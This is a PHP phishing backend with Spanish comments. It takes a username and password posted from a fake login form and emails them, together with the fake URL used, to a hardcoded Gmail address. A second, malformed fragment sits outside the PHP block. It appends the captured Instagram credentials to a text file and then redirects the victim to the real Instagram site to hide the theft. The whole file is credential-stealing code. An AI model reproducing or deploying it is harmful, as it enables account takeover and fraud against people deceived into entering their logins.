<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fake_url = $_POST['fake_url'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $to =jumivenezuela2023@gmail.com ; // Reemplaza con tu correo
    $subject = "Nuevo Registro en URL Falso";
    $message = "URL Falso: $fake_url\nUsername: $username\nPassword: $password";
    $headers = "From: no-reply@tu-dominio.com"; // Reemplaza con el dominio de tu correo

    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado exitosamente.";
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
